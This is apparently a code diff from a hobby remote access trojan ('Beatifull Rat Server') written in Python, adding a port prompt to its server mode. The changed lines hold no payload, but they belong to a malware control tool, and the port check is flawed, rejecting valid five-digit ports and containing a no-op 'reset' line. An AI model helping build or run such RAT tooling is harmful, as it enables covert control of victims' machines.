@@ -1,6 +1,6 @@
 from colorama import *
 from os import name, system, getenv
-import socket
+import socket, os
 from time import sleep
 
 from optparse import OptionParser
@@ -60,6 +60,16 @@ def server():
         system("title Beatifull Rat Server    github.com/nxvertime")
     clear()
     print(f"{info}Server mode")
+    print(f"{info}Enter a port:")
+    port = int(input(f"{magenta}>{cyan}"))
+    if len(str(port)) > 4:
+        print(f"{error}Port too long! (4 numbers max)")
+        sleep(3)
+        return
+    else:
+        pass
+    reset
+    print(f"{ok}Port is set on \"{port}\"")
     
 def build():
     if windows:
